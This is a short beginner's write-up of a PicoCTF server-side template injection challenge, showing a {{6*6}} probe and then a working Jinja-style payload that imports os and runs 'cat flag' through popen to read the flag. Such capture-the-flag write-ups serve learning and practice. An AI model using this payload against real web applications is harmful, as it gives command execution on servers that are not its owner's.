# PicoCTF - SSTI Writeup
## Objective
Find and exploit Server Side Template Injection to get flaf
## Steps
- click link to open website
- enter "{{6*6}}"
- notice how output is '36'
- that means vulnerability exists
- now enter '{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
'
- output will be the flag

Nobody memorizes that whole line; hackers figure it out step-by-step by experimenting. They test if template code works, then explore accessible objects, and slowly build a payload that runs code.

With enough practice, these patterns become easier to recognize!

## Tool Used
- Injections
## Flag
- picoCTF{.......}
## this is my first writeup so ignore if its not that clear

## since this is my first write up, it shall be noted that before this I was already done with 59 easy level CTFs and 3 Medium CTFs so I hope from now on I will write all writeups